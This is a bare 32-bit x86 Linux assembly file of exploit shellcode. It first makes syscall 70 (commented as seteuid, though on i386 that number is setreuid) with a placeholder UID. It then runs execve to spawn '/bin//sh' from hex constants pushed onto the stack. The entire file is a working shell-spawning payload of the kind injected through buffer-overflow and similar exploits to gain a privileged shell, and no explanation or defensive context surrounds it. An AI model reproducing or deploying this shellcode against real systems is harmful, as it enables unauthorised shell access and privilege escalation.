BITS 32
	; seteuid
	; eax: 70
	; ebx: uid
	; ecx: euid

	push BYTE 70
	pop eax

	push WORD UID
	pop ebx

	mov ecx, ebx

	int 0x80

  ; execve
  ; eax: 11
  ; ebx: pointer to shell
  ; ecx/edx: NULL
  xor ecx, ecx
	mov al, 11
  cdq
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  int 0x80
